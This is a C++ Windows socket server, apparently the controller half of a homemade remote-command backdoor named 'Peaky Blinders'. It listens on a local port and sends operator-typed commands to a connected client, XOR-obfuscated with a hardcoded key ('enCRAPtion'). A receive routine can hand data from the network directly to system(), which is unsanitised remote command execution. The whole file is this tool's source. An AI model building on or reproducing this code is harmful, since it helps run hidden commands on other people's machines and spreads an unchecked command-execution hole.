// Peaky_Blinders_Sever.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>
#include <stdio.h>
#include <iostream>
#include <string>

#pragma comment(lib, "WS2_32.lib")

class Socks {
protected:
	WSADATA wsaData;
	SOCKET ListenSocket;
	SOCKET ClientSocket;

public:
	Socks();
	~Socks();
	void resolve(addrinfo **info);
	void createNbind(addrinfo **info);
	void startlistening();
	void accept_connections();
	void endclient();
	int send_msg();
	int receive(int flag);
};

Socks::Socks() {
	int iResult = 0; //initialization result
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf_s("Socket Initialization: %d\n", iResult);
		//system("pause");
		WSACleanup();
		exit(1);
	}
}

Socks::~Socks() {
	WSACleanup();
}

//resolves address and port
void Socks::resolve(addrinfo **info) {
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int result = getaddrinfo("localhost", "80", &hints, info);
	if (result != 0) {
		printf("getaddrinfo failed with error: %d\n", result);
		WSACleanup();
		exit(2);
	}
}

//create a SOCKET for server and bind it
void Socks::createNbind(addrinfo **info) {
	ListenSocket = INVALID_SOCKET;
	addrinfo *result = *info;
	ListenSocket = socket(result->ai_family,
		result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(3);
	}

	int res = 0;
	res = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (res == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(4);
	}
}

//listen on server
void Socks::startlistening() {
	int result = listen(ListenSocket, SOMAXCONN);
	if (result == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(5);
	}
}

//accept connections on server
void Socks::accept_connections() {
	ClientSocket = INVALID_SOCKET;
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(6);
	}
}

//close socket
void Socks::endclient() {
	closesocket(ClientSocket);
	WSACleanup();
}

//send a message to the client
int Socks::send_msg() {
	int result = 0;
	std::string msg = "";
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();
	std::cout << "Enter Command: ";
	std::cin >> msg;
	int msg_len = msg.length();

	for (int i =0,x = 0; i < msg_len; i++, x++) {
		if (x >= peaky_len) {
			x = 0;
		}
		msg[i] = msg[i] ^ peaky[x];
	}
	printf("Encrypted string: %s\n", msg.c_str());

	result = send(ClientSocket, msg.c_str(), msg.length(), 0);
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 7;
	}
	else {
		receive(1);
	}

	return 0;
}

//receive message from client
int Socks::receive(int flag) {
	int result = 0;
	char recvbuf[4000];
	std::string msg = "";
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();

	result = recv(ClientSocket, recvbuf, 4000, 0);
	

	if (result > 0) {
		//parse actual data from message
		for (int i = 0; i < 4000; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}

		int msg_len = msg.length();
		//unencrypt
		/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
			if (x >= peaky_len) {
				x = 0;
			}
			//msg[i] = msg[i] ^ peaky[x];
		}*/
		printf("Unencrypted message: %s\n", msg.c_str());
		if (flag == 0) {
			system(msg.c_str());
		}
	}
	else if (result == 0)
		printf("Connection closed\n");
	else
		printf("recv failed: %d\n", WSAGetLastError());

	return 0;
}

int main()
{
	//variable declarations
	Socks serv_sock;
	addrinfo *info_ptr = NULL;

	//connection management
	serv_sock.resolve(&info_ptr);
	serv_sock.createNbind(&info_ptr);
	freeaddrinfo(info_ptr);
	serv_sock.startlistening();
	serv_sock.accept_connections();
	serv_sock.send_msg();
	//
	//serv_sock.receive(0);
	int temp = 0;
	std::cin >> temp;
    return 0;
}
